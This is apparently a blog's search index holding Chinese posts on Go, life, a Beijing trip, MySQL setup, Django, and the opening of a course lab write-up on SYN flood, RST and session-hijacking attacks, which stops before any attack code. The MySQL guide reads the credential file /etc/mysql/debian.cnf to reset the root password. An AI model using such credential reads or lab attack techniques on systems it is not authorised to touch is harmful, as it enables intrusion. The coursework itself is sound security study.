<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[Golang笔记-简介]]></title>
    <url>%2F2018%2F08%2F19%2FGolang%E7%AC%94%E8%AE%B0-%E7%AE%80%E4%BB%8B%2F</url>
    <content type="text"><![CDATA[Go 是一种非常高效的，支持并发 、垃圾回收的编译型开源系统编程语言，它能让构造简单、可靠且高效的软件变得容易。 Golang以前的logo是可爱的囊地鼠，生性懒散 ，Go特性之一是惰性求值（Lazy Evaluation），即延迟执行代码。 但是，Golang在2018年更换了如下的新logo，全新形象代表速度和效率： Golang的历史 C/C++ 的发展速度无法跟上计算机发展的脚步，十多年来也没有出现一门与时代相符的主流系统编程语言，因此人们需要一门新的系统编程语言来弥补这个空缺。在 Go 语言出现之前，开发者们总是面临非常艰难的抉择，究竟是使用执行速度快但是编译速度并不理想的语言（如：C++），还是使用编译速度较快但执行效率不佳的语言（如：.NET、Java），或者说开发难度较低但执行速度一般的动态语言呢？显然，Go 语言在这 3 个条件之间做到了最佳的平衡：快速编译，高效执行，易于开发。 Golang出生名门Google，介绍一下Golang的设计者： Robert Griesemer，参与开发 Java HotSpot 虚拟机； Rob Pike，Go 语言项目总负责人，贝尔实验室 Unix 团队成员，参与的项目包括 Plan 9，Inferno 操作系统和 Limbo 编程语言； Ken Thompson，贝尔实验室 Unix 团队成员，C 语言、Unix 和 Plan 9 的创始人之一，与 Rob Pike 共同开发了 UTF-8 字符集规范。 2007年，受够了C++煎熬的Google首席软件工程师Rob Pike纠集Robert Griesemer和Ken Thompson两位牛人，决定创造一种新语言来取代C++，这就是Golang。出现在21世纪的GO语言，虽然不能如愿对C++取而代之，但是其近C的执行性能和近解析型语言的开发效率以及近乎于完美的编译速度，已经风靡全球。 在 2009 年 10 月 30 日，Rob Pike 以 Google Techtalk 的形式第一次向人们宣告了 Go 语言的存在。直到 2009 年 11 月 10 日，开发团队将 Go 语言项目以 BSD-style 授权（完全开源）正式公布了 Linux 和 Mac OS X 平台上的版本。 Golang的优点 天生支持高并发。Goroutines 是 Go 面向线程的轻量级方法，而channel是 goroutines 之间通信的优先方式。Goroutine 和 channel 使得编写高并发的服务端软件变得相当容易，很多情况下完全不需要考虑锁机制以及由此带来的各种问题。单个 Go 应用也能有效的利用多个 CPU 核，并行执行的性能好。 编译速度快。编译时间用秒计算，相较于 Java 和 C++呆滞的编译速度，Go 的快速编译时间是一个主要的效率优势。 部署简单。Go 编译生成的是一个静态可执行文件，除了 glibc 外没有其他外部依赖。这让部署变得异常方便：目标机器上只需要一个基础的系统和必要的管理、监控工具，完全不需要操心应用所需的各种包、库的依赖关系，大大减轻了维护的负担。 开发效率。 GO语言使用起来简单、代码描述效率高、编码规范统一、上手快。通过少量的代码，即可实现框架的标准化，并以统一的规范快速构建API业务逻辑。能快速的构建各种通用组件和公共类库，进一步提升开发效率，实现特定场景下的功能量产。 执行性能好。Go 极其快，其性能与 Java 或 C++相似，Go 一般比 Python 要快 30 倍。 高效的垃圾回收机制。Go 拥有简单却高效的标记-清除回收器。它的主要思想来源于 IBM 的可复用垃圾回收器，旨在打造一个高效、低延迟的并发回收器。当然，使用一门具有垃圾回收功能的编程语言不代表你可以避免内存分配所带来的问题，分配和回收内容都是消耗 CPU 资源的一种行为。 …… Golang的适用场景 服务器编程，以前你如果使用C或者C++做的那些事情，用Go来做很合适，例如处理日志、数据打包、虚拟机处理、文件系统等。 分布式系统，数据库代理器等。 网络编程，包括Web应用、API应用、微服务等。 云平台，目前国外很多云平台在采用Go开发。 …… Golang的应用案例 Docker，基于Go语言的开源应用容器引擎。 kubernetes，Google 团队发起并维护的基于 Docker 的开源容器集群管理系统，它不仅支持常见的云平台，而且支持内部数据中心。 Docker Swarm，Docker官方提供的一款集群管理工具，其主要作用是把若干台Docker主机抽象为一个整体，并且通过一个入口统一管理这些Docker主机上的各种Docker资源。 Youtube，全球最大视频网站 七牛云存储，国内领先的企业级公有云服务商，致力于打造以数据为核心的场景化PaaS服务。 ……]]></content>
      <categories>
        <category>Programming language</category>
        <category>Golang</category>
      </categories>
      <tags>
        <tag>Golang</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[开始懂了]]></title>
    <url>%2F2018%2F08%2F19%2F%E5%BC%80%E5%A7%8B%E6%87%82%E4%BA%86%2F</url>
    <content type="text"><![CDATA[因为我没有期望，所以我也不再失望了。 近来的一点点生活感悟： 后来才明白，这么多年，妄图改变别人，做了那么多费力不讨好的事情，最后伤害的都是自己。人和人终究是不一样的，或许做好自己才是这个年纪最应该做的事吧。 听了再多的故事，学了再多的道理，也不及经历过一些事情来得实在。只有那些刻骨铭心的经历才能让自己的内心真正强大，所以能够有所经历、有所感悟，也是弥足珍贵的。 一次次见证没有计划带来的致命后果，也深知一次次的没有计划最终足够摧毁一个人，但还是很难去改变一些已经根深蒂固的东西。我想，合理的计划，谨慎地执行，及时的调整，离成功也就不远了。 最廉价的爱情，无非是迷失了自我，一味的妥协与讨好。其实，无论是友情亲情爱情，真正好的关系是不必讨好的。我们最爱的始终还应该是自己，至于最后能不能走下去，真的，看缘分。 要做到察言观色确实会很累，但是，时刻只顾及自己，又会显得十分天真，就像小孩一样。有时候会想，活着本来就很累了，要做那么多自己并不喜欢的选择，何必再去考虑别人的感受。当然，你也可以选择最舒服的方式活着，但是，不要忘了，你的世界不可能始终一个人。一个真正成熟的人不会轻易不顾别人的感受做一些事情。 能够互相见证成长应该是一件很棒的事情了吧。当我们经历人生的起起伏伏，彼此的祝福与鼓励都会让我们对未来充满希望。有时候觉得，这样的感情好纯粹，互相之间无比信任，无需计较太多，也不会害怕失去。感谢生命有你参与，愿你我情谊常存。 因为我没有期望，所以我也不再失望了。真正希望你进步的人才会对你有所期望，而失望并不可怕，可怕的是不再对你有所期望。所以，要合理看待失望，而不是害怕失望。我想，及时反思，尽力付出，才是让自己进步的方法。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[北京，再会]]></title>
    <url>%2F2018%2F08%2F08%2F%E5%8C%97%E4%BA%AC%EF%BC%8C%E5%86%8D%E4%BC%9A%2F</url>
    <content type="text"><![CDATA[2015年由于参加比赛匆匆到过北京，今年7月中旬再次来到北京。三年多过去，再次来到北京，不出所料，还是有很多不一样的感受。毕竟，在这三年里，北京又经历了快速的发展，而自己也经历过很多的事情，也增长了很多的见识。曾经的井底之蛙，面对帝都的一切都充满了敬意，现如今已不再像第一次那样懵懂，更多的是面对这些不一样所引发的深层思考。 学学想想 很荣幸能够参加这次在中科院计算所举办的龙星计划边缘计算课程。关于边缘计算这个领域，自己也是在今年年初才开始了解的，研读了一些基本的论文以及施老师出版的教材，然后在今年5月份我们实验室有幸邀请到施老师来给大家做学术报告，后续也针对边缘计算进行了系统调研。这次课程让我们进一步系统地了解了边缘计算的相关知识，也认识了国内在这个领域做研究的朋友们。 边缘计算 先说说边缘计算的定义以及它的优势，边缘计算（edge computing）作为一种新的计算模式，使数据在源头附近就能得到及时有效的处理，满足实时性、降低带宽和隐私保护等需求。与传统的云计算模式相比，边缘计算模式不单在靠近数据中心的节点上进行处理，而且还能绕过网络带宽与延迟的瓶颈，在数据传输过程中的每一个节点上执行数据处理。随着物联网和大数据时代的到来，这种带宽和延迟的优化显得尤其重要。因此，边缘计算不仅得到了学术界的广泛认可，相关的论文层出不穷，还获得了产业界的青睐，华为、阿里、百度、腾讯等大公司都对边缘计算十分感兴趣。在这五天的课程里，施老师给我们讲的第一课就是如何成为一个科学家，从一个成功的科学家的心路历程开始讲起，到方法论，再到对我们的美好祝愿。最让我觉得认同的是他对于科研的一些理解，科研不仅仅是为了论文，而应该是解决实际问题的副产品，不应该像某些只注重论文成果的科研人员，纯粹变成论文机器。同时，施老师也为我们精心准备了边缘计算的课程内容，从边缘计算的愿景、应用场景、挑战、现有的系统以及安全与隐私保护五个方面进行了详细的讲解。此外，他还邀请了寒武纪、中移物联网、百度的三位嘉宾与我们分享他们在边缘计算方面的一些工作与思考。 寒武纪 对于寒武纪，我以前并不太了解，其实，它是一家做智能芯片的公司，世界首款商用深度学习专用处理器。它被誉为“全球首款AI芯片”华为麒麟970的幕后功臣“。因为寒武纪的产品已经被集成到华为的麒麟芯片中，并且运用到华为P20等实际的产品中，使得语音识别、人脸识别等机器学习技术在移动终端上得到更好的应用。去年，成立一年多的寒武纪完成1亿美元A轮融资，阿里、联想等巨头等都有投资，可以说外界对其十分看好。 给我们做报告的是寒武纪的陈云霁研究员，他和弟弟陈天石都是中科院计算所的研究员，都来自中科大少年班，充满着传奇色彩。陈云霁研究员的研究方向是芯片，而弟弟陈天石主要是做人工智能，兄弟俩当年思考未来科技发展的方向时，很自然地就决定结合起来做人工智能芯片。他们就是我佩服的研究人员，从实际出发，为了国家的科技进步，不仅发表了很多顶级会议的论文，并且引起了国际学术界的关注。同时，从科研到再到创办实际的公司，想必他们也付出了很多。由于陈研究员很忙，短短20分钟的报告，大致向我们介绍了他们的一些工作，以及他们对于人工智能芯片对边缘计算的意义。边缘计算在一定程度上就是解决机器学习算法在云端运行存在的问题，因为每次都需要将数据传送到云端，以图像识别为例，如果每次都上传到云端，会带来巨大的带宽消耗。有了机器学习芯片的支持，就可以更好的在终端运行机器学习算法，实现云端训练模型，然后在终端运行的目标。 中移物联网和百度 中移物联网是我本科期间就接触过的公司，使用过他们的OneNET物联网云平，也申请过他们的麒麟座开发板（虽然并没有好好地使用过，惭愧啊！），对于他们公司的产品也还算比较了解。中移物联网数字化产品部的吴经理在给我们的远程报告中介绍了他们公司的一些产品，主要集中在智能家居和车联网场景，以及他们认为的边缘计算的可能需求，主要介绍了智能家居、车联网和智能网关三个案例中采用边缘计算的设想。后来，百度的吴经理也给我们介绍了百度边缘计算的思考，他提到AI走向边缘计算的必然性，需要应对AI应有的时延要求、应对网络阻塞问题、分布式计算能力的获取，数据安全与隐私。大家都知道百度一直号称是AI公司，一直主推All in AI，但是AI训练和AI推理具有不同的特点和要求，AI训练需要庞大算力和数据 ，那么集中就成为必然，而AI推理涉及用户体验，需要快速响应，即推理服务请求应该随时服务，不应该也不能等待。这就使得云计算与边缘计算结合成为可能，这也可以在一定程度上促进AI的发展。核心云计算进行AI训练，边缘计算进行AI推理，这 将成为AI发展的一个方向。由于这两家公司与我们的研究十分相关，所以后续我们还会与他们有详细的交流，有机会再写博客分享。 思考 这次到北京的主要目的是学习交流，由于时间有限，虽然没有学到太多的干货，但是这次的课程也确实让我增长了见识，扩宽了自己的科研视野，也使我对边缘计算领域有了更深入更全面的认识。在中科院，见识了什么是真正的科研。感慨在学校里，部分老师只为了发论文评职称评，很多东西都很虚。可惜的是，当前的制度就是论文和成果为王，这其实也很影响真正做科研的人。所以，我现在也依然很迷茫，不知道未来的路在哪里。仔细思考当前研究界和产业界对边缘计算这个领域的关注度，按照边缘计算目前火热的趋势，我觉得还是有很多的机会，如果潜心做下去，一定大有可为。 走走看看 再次去到天安门，相比第一次来时的激动与敬仰之情，这一次，内心略显平淡。但是，走在人来人往的长安街，依然还是感到骄傲！作为一名共产党员，我本来想去看天安门广场看一次升国旗仪式，但是听了朋友讲述的经历，突然觉得没有太大必要了。为了看升旗，很早就要去排队，晚上基本不能睡觉，这样的事我应该是不会做的。不过，说不定，以后会有特别想去看的时候。第一次去北京的时候并没有去故宫。今年年初，经朋友推荐，看了故宫博物院单霁翔院长的演讲，哇，一位隐藏的段子手，瞬间被圈粉了。所以，这次去北京就早早地计划要去故宫看看。大殿内的金碧辉煌，仿佛在诉说着明清王朝的昔日盛世。昔日的皇家圣地，也成了今日的旅游胜地，仿佛在诉说着明清王朝的衰败。 回忆起看过的《明朝那些事儿》，感慨朱棣迁都北京的壮举，留下了这么壮观的紫禁城。登景山公园，俯瞰故宫紫禁城全景。遥望这大大小小的宫殿，感觉确实非同一般。站在景山公园最高建筑“万春亭”，登高远眺，故宫全景尽收眼底。不论从哪个角度看，故宫规模宏大、辉煌大气，给人以强烈的视觉震撼！ 在国家博物馆，感受博大精深的中华文化。由于对古代中国的历史并不是特别清楚，对于青铜器等历史文物等也不是很感兴趣，所以印象比较深刻的是《复兴之路》基本陈列。复兴之路基本陈列总共分为五个大部分，第一部分，中国沦为半殖民地半封建社会；第二部分，探索救亡图存的道路；第三部分，中国共产党肩负起民族独立、人民解放的历史重任；第四部分，建设社会主义新中国；第五部分，走中国特色社会主义道路。它展示了我们中华民族从鸦片战争以来一百多年团结奋斗、自强不息的历史，展现了中华民族不屈不挠英勇抗争、在中国共产党领导下寻路奋斗求解放、艰辛探索搞建设、改革开放谋发展走中国特色社会主义强国之路的壮丽史诗和宏篇巨著。 回顾这段复兴之路，多少英雄为此付出了生命，多少伟大的人为国家的发展。但是，再看看现如今中国式悲哀频频上演，明星家事天下知，英雄事迹鲜有闻。泛娱乐化的时代，明星的八卦被炒得沸沸扬扬，而为国家发展默默奉献的科学家、军人、工人等等却很少得到该有的关注和尊重。我们今天安定富足的生活来之不易，没有革命军人的流血牺牲哪来的和平？没有科学家孜孜不倦的科研和发明哪来的高科技？没有农民和工人的辛勤劳作哪来的丰衣足食和住行舒适？不否认，明星给我们的业余生活增添了乐趣，但社会的发展不是他们演两部戏唱两首歌就能进步的。虽然我们无法左右周围人的价值观，也无法改变这个社会，但我们可以传递正能量。回顾中华民族的屈辱历史，再感受今天中国的伟大成就，以及展望可以预见的美好未来。我们应该牢记历史，不忘初心，怀揣梦想，并为之努力奋斗，这个国家才能越来越好。 见见聊聊 在开课前两天到达北京，去见了老友，他们一起陪我玩了两天。一起去故宫，去国博，去天安门，一起看电影，一起撸串，一起在中传的操场畅谈人生。很幸运，能有这样一群朋友陪着我在帝都吃吃喝喝、聊聊逛逛。毕业后，不同的人选择了不同的方向，一年以后，我发现大家关心的话题开始有了变化。工作的开始担心房子、房贷的问题，读研的开始准备找工作，或者说继续深造。各有各的烦恼，各有各的开心，北漂的艰难，不一样的生活节奏，在帝都成长的喜悦，所接触的人事物，都让我觉得有些遥不可及。另外，工作的羡慕读书的时间自由，读书的羡慕工作的财富自由。很多时候，我们就在这样的羡慕中做着各自的努力，直到有一天，我们的生活慢慢有更多的共同话题，于是我们也都长大了。 在北京的这周里，去了好几所学校，清华、北大、北航、北邮，对于帝都的学校，一直有一种敬畏感。但是，与朋友、学长学姐交流才发现，当你真正了解以后，也没有那么的神圣。这些学校确实有很多很多厉害之处，也有很多超厉害的人物，但是与我们也有很多相似之处，没有那么遥不可及。在北邮，见了很想见的学长学姐，交流甚欢。曾经不要我的北邮，听他们说来也没有想象中的那么好。虽然很遗憾，没能到帝都去读研，但是现在想来曾经给我建议的恩师让我选择了现在的学校也是没错的，至少现在也还蛮知足。在北航，见了曾经的初中老友，多年没见的我们，再次见面依然无话不聊。吐槽研究生生活，回忆初中快乐时光。在清华北大，感受不一样的氛围，恬静幽雅的校园环境，古建筑那种古朴的气息浓郁而悠远，顶尖高校特有的书香气息扑面而来。在清华园，逛到水木清华，想起才子李健，这种说不出来的崇敬油然而生。在北大未名湖畔，寻觅季羡林笔下的未名湖，在浓郁的中国风建筑里感受中国传统文化。一所大学的灵魂在于它的文化，没有文化的大学几乎没有未来，也不会培养出太多的人才，当然，清北都是有灵魂的。 闲聊时，经常和老友吐槽在北京的种种较差的体验，赶上北京难得一遇的大暴雨，空气太过潮湿，实在是不太适应这样的气候。虽然个人对于北京没有那么向往，也并不是我所理想的城市，但是，对于中国的政治、经济、文化中心，内心还是十分崇敬的。我也多次提及对帝都丰富资源的羡慕，超多的高校、听不完的讲座以及数不胜数的初创公司等等，这些对于年轻人来说这是很不错的。更多的资源意味着更多的机会，更多的可能，这也是为什么会那么多北漂的人。 匆匆到来，又匆匆离去。见证了帝都的深厚的历史文化底蕴，感受了繁华都市里充满生机与活力的氛围，也了解了北漂一族的不易。祝在这里的你们都好，愿你们在异常艰难的北漂生活中能够被温柔以待。我果然又不负众望地将这篇博客成功拖了将近一个月，不过已经写了很多了。当然，我也还有很多想要分享的，如果你有酒的话，下次当面讲故事给你听。总之，再次到访北京，果然不虚此行。北京，再会！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[有你的样子，真好]]></title>
    <url>%2F2018%2F07%2F13%2F%E6%9C%89%E4%BD%A0%E7%9A%84%E6%A0%B7%E5%AD%90%EF%BC%8C%E7%9C%9F%E5%A5%BD%2F</url>
    <content type="text"><![CDATA[你在我身边像个小孩，单纯而善良。今后我所有的牵挂，所有的向往，都和你一样。让我们，平静渡过漫长。 我的女神， 我们的第1个100天，要说感想也还是蛮多的。这段时间，经历过开心与惊喜，也有伤心和难过，或许这就是爱情本来该有的样子。我有我的小脾气，你有你的小倔强，几乎每周我们都要讨论是不是真的爱我，也是慢慢的，我才选择去相信。有时候，我确实有些感性，一开始我就想把你紧紧抱着，就像你现在也会自私的想要让我始终就是你一个人的。这样的想法我很早就有了，所以才会因为一些事情生气。 我的认真主动，你的后知后觉，有时候让我觉得很害怕会失去。还好，现在终于有了把你紧紧抱住的感觉。暑假的短暂离别，从一开始的不适应，到后来的理解。其实，这段时间也算是是对我们的考验，可以让我们更好的去思考应该如何相处。特别是最近在看刘若英的《我敢在你怀里孤独》，我突然就对你这样性格的人有了更深刻的认识，对于如何处理独处与相处也有了新的体会。其实，了解一个人本来就是很有意思的事情，更何况是了解自己喜欢的人呢。经过这100天的了解，我也是慢慢能够理解你的一些行为，希望你也可以试着去理解我。 我们原本就是很不一样的人，我很有条理，你却很随性。但是我很喜欢这样的不一样，就像你曾经和我说，如果我找一个和我一模一样的人，那该有多无聊。确实，我们就是有太多的不一样才会有这样有意思的100天。每次翻开聊天记录，满满的都是恋爱的味道。不过，在一起的这些日子，你确实改变了我很多，无论是一些生活习惯，还是对爱情的认识。或许真的是觉得找到了对的人，我才会这样愿意去等待，去为你而改变吧。 你总说你想要最舒服的生活方式，不想有太多的束缚，不想太累，我当然也希望你可以一直这样，我也会尽量让你这样。但是，还是希望你自己能很好地去处理一些事情。我也想我可以为你做好所有的事情，我也希望我会是可以随时保护你的人，但是有些事情还是会需要你自己去做。所以，有时候还是会很担心你，毕竟有些路我已经走过，还是希望你能够意识到其中的不易，以便早做准备。总之，希望你变得更好。 你说，我的宽容，我的耐心，我的尊重让你很容易就为我沦陷，这应该是这100天里，我听过最开心的话，哈哈。你说我在爱情方面像个小孩，而我却觉得你在我身边，很多时候都像小孩，单纯而善良。其实，你的善良和天真也是我一直想要守护的东西，所以我才会对你宽容、有耐心以及尊重。虽然我依然常常扮演着学长的角色，经常教育你，甚至有时候也会因为你不听而生气。后来，甚至会有无能为力的感觉。我确实很希望能够改变你，但是你不喜欢刻意去改变，后来，我也慢慢意识到这样的改变确实会很累。所以，我也希望我们能够继续守护彼此那些不一样的东西。 莫文蔚的那首《慢慢喜欢你》很好地诠释了我们在一起的过程中你给我的感觉。你真的是一个慢热的人，就像歌词写的，慢慢喜欢你，慢慢的亲密，慢慢聊自己，慢慢和你走在一起……我们就像是这样，从你一开始所说的不习惯，到现在慢慢依赖我，爱我。我都不曾想过我们会像现在这样好，但是，我现在确实感觉很幸福，我们互相拥有，互相珍惜。 谢谢你选择与我相伴，信任我，给与我不曾有的感觉，让我有足够的力量更好地往前走。希望我们能够继续过好我们以后很多的100天，希望我们可以一起互相陪伴，度过人生的潮起潮落。我会学习成为一个好男友，希望带给你更多的幸福，给你留下很多感动的回忆。 没想到可以写这么多（公开的博客，也就没有放女神的照片啦，见谅！），又一个为我们熬的夜，很开心，哈哈。我已经想象过无数次我们以后的样子，经常想着想着就会笑。嗯，有你的样子，真好！不想谈太久太久以后的事情，我觉得，如果以后都能好好的走下去的话，我相信，很多事情也就都会是顺其自然的。 爱你的男神。]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[停更半年，再次回归]]></title>
    <url>%2F2018%2F07%2F12%2F%E5%81%9C%E6%9B%B4%E5%8D%8A%E5%B9%B4%EF%BC%8C%E5%86%8D%E6%AC%A1%E5%9B%9E%E5%BD%92%2F</url>
    <content type="text"><![CDATA[有所计划，顺其自然。 自2018年初博客停止更新，至今已有将近半年的时间，最近一直在思考，自己曾坚持几年的东西竟然丢下这么久了，想想还有些后怕。最近突然意识到这半年自己有点迷失，希望能够慢慢找回自己。时隔将近半年，重新开始写博客，确实感到有些生疏，不过，这种感觉还是那么熟悉。 先说说这半年我为什么没有坚持继续写博客吧。主要有以下几个方面的原因，一是，自己目前正处于研究生期间，每天有固定的工作（学习）时间，留给自己的时间并不多，并且由于所研究的内容涉及到一些课题组的利益，所以不太方便写成博客进行发表；二是，自己也在思考，步入研究所阶段，写的博客是不是应该更加有深度，而不再把它当作笔记本，因此，自己也在忙着充电，读一些有意义的书，学习新的技术等。三是，忙于自己人生的大事的一部分，谈恋爱。找到一个互相喜欢的人也还是蛮开心的，所以也确实花了不少时间来共度美好的时光。最近也在思考，两个人在一起应该互相支持，共同进步，而不仅仅只是玩耍。 然后，说说对于这个博客我自己的一些思考与计划。前面提到，希望写出更有深度的内容，因此，一方面，我打算介绍一些更新的技术。很老的技术我就不再打算写了，主要侧重于自己实践过的知识或者是技术，根据自己的体会做一些推荐和建议。另一方面，我会多写一些自己对生活的一些感悟，包括观后感、读后感或者是突然的感悟等等。毕竟是私人博客，所以所写的内容肯定会有一些个人的偏见，当然，我会尽可能客观的表达自己的看法。如果有不同的观点和看法，还希望看我博客的朋友能够多多包涵，也可以私下交流。 最后，感谢关注过我博客的所有人。从CSDN博客平台到Wordpress自建博客，再到现在的Github Pages，累计浏览人数已经超过20万。虽然现在的Github Pages没有CSDN那么大的流量，但是还是更喜欢现在的方式。因为，相比于CSDN，私人博客不仅仅可以写技术，也可以谈谈生活。在这个过程中，我其实也收获了很多，认识了很多素昧平生的人，与他们交流我也学到了很多新的知识。即使CSDN的博客已经很久没有更新了，还是有人给我发邮件请教问题或者是表达感谢，这些小事给我带来的成就感是源源不断的 。我想，我还是会尽力写下去，也希望得到更多人的认可与支持。谢谢你们！]]></content>
      <categories>
        <category>Life</category>
      </categories>
      <tags>
        <tag>Life</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Ubuntu16.04中Mysql 5.7 安装配置]]></title>
    <url>%2F2018%2F01%2F26%2FUbuntu-16-04%E4%B8%ADMysql-5-7-%E5%AE%89%E8%A3%85%E9%85%8D%E7%BD%AE%2F</url>
    <content type="text"><![CDATA[记录在Ubuntu 16.04安装Mysql 5.7时遇到的一些问题。 Mysql安装 使用如下命令进行安装： 1sudo apt-get install mysql-server mysql-client 检查安装是否成功以及MySQL是否运行： 1sudo netstat -tap | grep mysql 启动/关闭/重启 Mysql： 123sudo service mysql start # 启动sudo service mysql stop # 关闭sudo service mysql restart # 重启 通过以上步骤基本已经完成安装，但是我们也应该注意到，安装过程中都没有要求填写用户名和密码。终端输入mysql -u root -p之后，要求输入密码，但是我们并没有设置密码，随便输入之后，提示如下错误： 1ERROR 1045 (28000): Access denied for user &apos;root&apos;@&apos;localhost&apos; (using password: YES) 查找资料发现5.7版本与之前的版本不太一致，需要一些特殊的操作，具体请看下一节。 Mysql 5.7 root无法登录的问题 在这个文件里面有着MySQL默认的用户名和用户密码，用户名默认的不是root，而是debian-sys-maint，如下所示： 1&gt; cat /etc/mysql/debian.cnf 使用该账号进行登录： 1&gt; mysql -u debian-sys-maint -p 查询已有的数据库 1&gt; show databases; 操作mysql数据库： 1&gt; use mysql 查看mysql数据库中有哪些表： 1&gt; show tables; 可以看到有一个user表，我们查询user表中的用户和密码： 1select user,authentication_string from user 注意：这里不能查询password字段（如下命令），因为在新版本中password字段已经被authentication_string字段替换。 1&gt; select user,password from user 更新user表中root用户的密码： 1&gt; update user set authentication_string=password(&apos;新密码&apos;) where user=&apos;root&apos;; 重新加载权限表，一定要进行这一步，否则更新不会生效： 1flush privileges 最后，即可使用root用户以及我们设置的密码进行登录： 1&gt; mysql -u root -p 注意：由于用户debian-sys-maint的信息可以从文件中查找到，因此最好将其密码也改一下。]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Mysql</tag>
        <tag>Ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Python Django学习笔记（一）]]></title>
    <url>%2F2018%2F01%2F13%2FPython-Django%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%EF%BC%88%E4%B8%80%EF%BC%89%2F</url>
    <content type="text"><![CDATA[Django是一个Web框架，它采用MTV（Model-Template-View）模型组织，相比其他框架，Django充分利用Python特点，开发效率更高。 环境配置这篇博客基于：Python3.6 + PyCharm社区版 + Windows7命令行 使用pip安装django： 1&gt; pip install django Django开发简单示例 创建工程：>django-admin startproject mysite 修改工程： 2.1 创建一个具体应用（app） 2.2 修改应用的views.py：对URL的具体响应功能 2.3 修改URL路由：指定URL与响应之间的关系 运行测试工程：>python manage.py runserver Django工程创建工程打开cmd，使用django-admin工具创建Django工程： 1&gt; django-admin startproject mysite 目录结构1234567.├── manage.py└── mysite ├── __init__.py ├── settings.py ├── urls.py └── wsgi.py manage.py 一个实用的命令行工具，实现以各种方式与该Django项目进行交互。 __init__.py 让 Python 把该目录当成一个开发包 (即一组模块)所需的文件。 这是一个空文件，一般你不需要修改它。 settings.py 部署和配置整个工程的配置文件，包含Django的设置、配置文件，比如DEBUG的开关，静态文件的位置等等。 urls.py 可视其为Django网站的目录，URL路由的声明文件（路由文件），链接入口，关联到对应的views.py中的一个函数（或者称作generic类），访问的链接就对应一个函数。 wsgi.py 基于WSGI的Web服务器的配置文件。 django-admindjango-admin是一个Django框架全局的管理工具，它具有以下功能： 建立并管理Django工程 建立并管理Django工程使用的数据库 控制调试或日志信息 运行并维护Django工程 使用示例： 1&gt; django-admin &lt;command&gt; [options] 查看更多命令可使用帮助： 1&gt; django-admin -help manage.py与django-admin类似，但manage.py仅针对当前项目。 查看更多命令可使用帮助： 1&gt;python manage.py help 使用示例： 123&gt; python manage.py &lt;command&gt; [options]or&gt; python –m django &lt;command&gt; [options] 运行工程1&gt; python manage.py runserver 打开浏览器，输入 http://127.0.0.1:8080 即可看到Django默认的页面。 Django应用工程对应于一个网站，是配置和应用的集合，应用对应于特定功能，是具体功能的载体，配置和功能分离是高度模块化的体现。 创建应用一般一个项目有多个app，当然通用的app也可以在多个项目中使用。 1234&gt; cd mysite&gt; django-admin startapp appor&gt; python manage.py startapp app Django应用目录结构12345678910.├── app│ ├── admin.py│ ├── apps.py│ ├── __init__.py│ ├── migrations│ │ └── __init__.py│ ├── models.py│ ├── tests.py│ └── views.py admin.py 后台文件，可以用少量的代码就拥有一个强大的后台。 apps.py App的配置文件。 __init__.py 让 Python 把该目录当成一个开发包所需的文件。 views.py 包含对某个HTTP请求(url)的响应，用于处理用户发出的请求，从 urls.py 中对应而来，通过渲染 templates 中的网页可以为用户显示页面内容，比如登录后的用户名，用户请求的数据，通过其输出到页面。 models.py 与数据库操作相关，存入或读取数据时使用。当不使用数据库的时候，也可以当做一般的类封装文件，存储各种类的定义。 修改应用 修改应用的views.py views.py中包含对某个HTTP请求(url)的响应，在其中添加以下代码： 12345from django.http import HttpResponse# 设置处理请求的函数def hello(request): return HttpResponse(&apos;Hello, Welcome!&apos;) 修改工程的url.py中的URL路由 在urls.py中指定URL与处理函数之间的路径关系，在文件中添加指定路由： 12345678from django.contrib import adminfrom django.urls import pathfrom app import views # 添加app的viewsurlpatterns = [ path(&apos;admin/&apos;, admin.site.urls), path(&apos;index/&apos;, views.hello) # 添加路由条目] 注：Pycharm导入自己写的包时可能会报错，这时候需要在项目目录上右键选择Mark Directory as，然后选择Source Root。 运行测试工程运行Django： 1&gt; python manage.py runserver 使用浏览器访问以下地址： http://127.0.0.1:8000/index/ 可以看到已经正常显示了：Hello, Welcome!]]></content>
      <categories>
        <category>Programming language</category>
        <category>Python</category>
      </categories>
      <tags>
        <tag>Python</tag>
        <tag>Django</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Seed Labs: TCP/IP Attack Lab]]></title>
    <url>%2F2018%2F01%2F12%2FSeed-Labs-TCP-IP-Attack-Lab%2F</url>
    <content type="text"><![CDATA[网络与计算机安全课程实验（二），TCP/IP攻击。 实验原理与目的 TCP/IP协议从开始设计时候并没有考虑到现在网络上如此多的威胁，由此导致了许多形形色色的攻击方法。本次实验涉及了TCP/IP攻击的三种基本类型，（1）SYN洪泛攻击，（2）TCP RST攻击，（3）TCP会话劫持攻击。希望通过本次实验了解TCP/IP攻击的原理，通过实际操作掌握基本的攻击方法，学会如何防范此类攻击。 实验配置 基本配置与上一个实验：Local DNS Attack Lab基本一致。按照实验指导手册，配置3台虚拟机，1台作为DNS服务器，1台作为用户机，另1台作为攻击者，3台机器通过设置NAT网络来实现网络互访。 实验资料下载地址： http://www.cis.syr.edu/~wedu/seed/Labs_12.04/Networking/TCPIP/ 启用telnet服务器 对于本实验，实验要求启用ftp和telnet服务器，但是其实在后续的实验中只用到了telnet。为了安全起见，Ubuntu系统中安装的这些服务通常是默认禁用的，所以需要以root用户身份运行以下命令来启用： 12$ sudo service vsftpd start$ sudo service openbsd-inetd start 实验过程SYN 洪泛攻击 SYN 洪泛是DoS攻击的一种形式，攻击者向受害者的TCP端口发送多个SYN请求，但是攻击者无意完成三次握手过程。攻击者要么使用欺骗性的IP地址，要么不要继续这个过程。通过这种攻击，攻击者可以淹没用于半开连接的受害者队列，即完成SYN，SYN-ACK但尚未得到最终ACK的连接。当这个队列已满时，受害者不能再进行连接。 队列的大小有一个系统范围的设置。在Linux中，我们可以使用以下命令检查设置：1$ sysctl -q 